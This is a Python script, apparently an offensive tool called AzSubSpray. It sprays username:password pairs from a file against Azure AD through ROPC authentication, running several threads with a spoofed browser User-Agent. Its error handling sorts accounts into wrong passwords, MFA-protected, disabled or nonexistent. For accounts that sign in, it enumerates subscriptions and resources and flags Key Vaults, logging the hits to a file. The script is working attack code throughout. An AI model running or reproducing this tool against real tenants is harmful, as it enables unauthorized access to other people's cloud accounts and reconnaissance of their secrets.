#!/usr/bin/env python3
"""
azsubspray.py

Reads a file with lines in the format:
  username@example.com:password123

Attempts ROPC (username/password) auth for each user (MSAL) and lists subscriptions.
NOT recommended for production. Will fail if the tenant or account blocks ROPC or if MFA is required.
"""

import sys
import os
import argparse
from concurrent.futures import ThreadPoolExecutor

import requests
from msal import PublicClientApplication
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Defaults — can be overridden via args
THREADS = 10
VERBOSE = False
CLIENT_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
AUTHORITY = "https://login.microsoftonline.com/organizations"
SCOPE = ["https://management.azure.com/.default"]
AZURE_SUBS_URL = "https://management.azure.com/subscriptions?api-version=2020-01-01"
RESOURCE_URL_TEMPLATE = "https://management.azure.com/subscriptions/{subscriptionId}/resources?api-version=2021-04-01"

def try_list_subscriptions(username: str, password: str):
    app = PublicClientApplication(client_id=CLIENT_ID, authority=AUTHORITY)
    try:
        result = app.acquire_token_by_username_password(username=username, password=password, scopes=SCOPE)
    except Exception as e:
        print(f"{Fore.RED}[X] Exception during token acquisition - ")
        return

    if not result or "access_token" not in result:
        err = result or {}
        error_desc = err.get('error_description', '')
        if "multi-factor authentication" in error_desc.lower():
            print(f"{Fore.RED}[X] MFA Required - {username}")
        elif "due to invalid username or password" in error_desc.lower():
            print(f"{Fore.RED}[X] Incorrect password - {username}")
        elif "No tenant-identifying information found" in error_desc.lower():
            print(f"{Fore.RED}[X] Tenant does not exist - {username}")
        elif "user account is disabled" in error_desc.lower():
            print(f"{Fore.RED}[X] User is disabled - {username}")
        elif "account must be added to the directory" in error_desc.lower():
            print(f"{Fore.RED}[X] On-prem user not synced - {username}")
        else:
            print(f"{Fore.RED}[X] Failed - {username}: {err.get('error')} - {error_desc}")
        return

    if VERBOSE:
        print(f"{Fore.GREEN}[✓] Retrieved access token - {username}")
    token = result["access_token"]
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": USER_AGENT
    }

    try:
        resp = requests.get(AZURE_SUBS_URL, headers=headers, timeout=15)
    except Exception as e:
        print(f"{Fore.RED}[X] HTTP request exception - {username}")
        return

    if resp.status_code == 200:
        subs = resp.json().get("value", [])
        if not subs:
            return
        print(f"{Fore.GREEN}[✓] {username}")
        with open("subscriptions.txt", "a") as f:
            f.write(f"{Fore.GREEN}[✓] {username}\n")
        print(f"\t{Fore.YELLOW}[!] Subscriptions:")
        for s in subs:
            name = s.get("displayName", "<no-name>")
            sid = s.get("subscriptionId", "<no-id>")
            state = s.get("state", "<no-state>")
            # Count resources in the subscription and check for KeyVault
            keyvault_present = False
            try:
                res_resp = requests.get(
                    RESOURCE_URL_TEMPLATE.format(subscriptionId=sid),
                    headers=headers,
                    timeout=15
                )
                if res_resp.status_code == 200:
                    resources = res_resp.json().get("value", [])
                    resource_count = len(resources)
                    # Check for KeyVaults
                    for r in resources:
                        if r.get("type", "").lower() == "microsoft.keyvault/vaults":
                            keyvault_present = True
                            break
                else:
                    resource_count = "<error>"
            except Exception:
                resource_count = "<error>"

            print(f"\t  {Fore.CYAN}- {name} ({sid}) [{state}] — {resource_count} resources")
            with open("subscriptions.txt", "a") as f:
                f.write(f"\t  {Fore.CYAN}- {name} ({sid}) [{state}] — {resource_count} resources\n\n")
            if keyvault_present:
                print(f"\t    {Fore.MAGENTA}[!] KeyVault detected in this subscription!")
    else:
        print(f"\t{Fore.RED}[X] Failed to list subscriptions: HTTP {resp.status_code}")
        try:
            print(resp.json())
        except Exception:
            print(resp.text)

def main():
    global CLIENT_ID, USER_AGENT, THREADS, VERBOSE

    print("== AzSubSpray ==")

    parser = argparse.ArgumentParser(description="Spray Azure accounts to list subscriptions via ROPC.")
    parser.add_argument("userpassfile", help="File with username:password per line")
    parser.add_argument("--client-id", type=str, help="Override the Azure AD client ID")
    parser.add_argument("--user-agent", type=str, help="Custom User-Agent for subscription request")
    parser.add_argument("--threads",  type=int ,help="Number of threads to use. Default is 10.")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    if args.client_id:
        CLIENT_ID = args.client_id
    if args.user_agent:
        USER_AGENT = args.user_agent
    if args.threads:
        THREADS = int(args.threads)
    if args.verbose:
        VERBOSE = True

    print("Client ID:", CLIENT_ID)
    print("User Agent:", USER_AGENT)
    print("Threads:", THREADS)

    filepath = args.userpassfile
    if not os.path.isfile(filepath):
        print(f"{Fore.RED}File not found: {filepath}")
        sys.exit(1)

    with open(filepath, "r", encoding="utf-8") as f:
        lines = f.readlines()

    usernames = []
    passwords = []

    for raw in lines:
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if ":" not in line:
            print(f"{Fore.RED}Skipping malformed line (no colon): {line}")
            continue
        username, password = line.split(":", 1)
        username = username.strip()
        password = password.rstrip("\n")
        if not username or not password:
            print(f"{Fore.RED}Skipping line with empty username or password: {line}")
            continue
        usernames.append(username)
        passwords.append(password)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        executor.map(try_list_subscriptions, usernames, passwords)

    print("Subscriptions written to subscriptions.txt")

if __name__ == "__main__":
    main()
